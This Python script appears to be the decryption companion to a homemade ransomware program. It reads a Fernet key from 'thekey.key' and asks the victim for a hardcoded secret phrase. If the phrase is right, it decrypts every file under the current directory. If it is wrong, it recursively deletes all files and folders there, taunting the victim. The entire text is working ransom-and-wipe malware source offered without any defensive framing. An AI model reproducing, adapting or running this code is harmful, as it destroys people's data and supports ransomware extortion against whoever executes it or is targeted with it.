#!/usr/bin/env python3

import os
import shutil
from cryptography.fernet import Fernet

# Function to recursively collect all files
def collect_files(directory):
    all_files = []
    for root, _, files in os.walk(directory):  # Recursively walk through all directories and subdirectories
        for file in files:
            filepath = os.path.join(root, file)
            if file not in ("virus.py", "thekey.key", "fix.py"):  # Skip the script and key files
                all_files.append(filepath)
    return all_files

# Function to delete all files and directories
def delete_all(directory):
    for root, dirs, files in os.walk(directory, topdown=False):  # Walk in reverse to delete subdirectories first
        for file in files:
            filepath = os.path.join(root, file)
            try:
                os.remove(filepath)
                print(f"Deleted file {filepath}")
            except Exception as e:
                print(f"Failed to delete {filepath}: {e}")
        for dir in dirs:
            dirpath = os.path.join(root, dir)
            try:
                shutil.rmtree(dirpath)
                print(f"Deleted directory {dirpath}")
            except Exception as e:
                print(f"Failed to delete {dirpath}: {e}")

# Collect all files in the current directory and its subdirectories
files = collect_files(".")

# Read the decryption key
with open("thekey.key", "rb") as key:
    secretkey = key.read()

# Define the secret phrase
secretphrase = "aarush"

# Prompt the user for the secret phrase
user_phrase = input(
    "Enter the secret phrase to decrypt your files (take care to put in the secret phrase correctly or you will lose all your files permanently):\n"
)

if user_phrase == secretphrase:
    for file in files:
        try:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        except Exception as e:
            print(f"Failed to decrypt {file}: {e}")
    print("Congrats, your files are decrypted. Enjoy your files!")
else:
    print("Sorry, wrong secret phrase. Say bye to your files!!!")
    # Delete all files and directories
    delete_all(".")
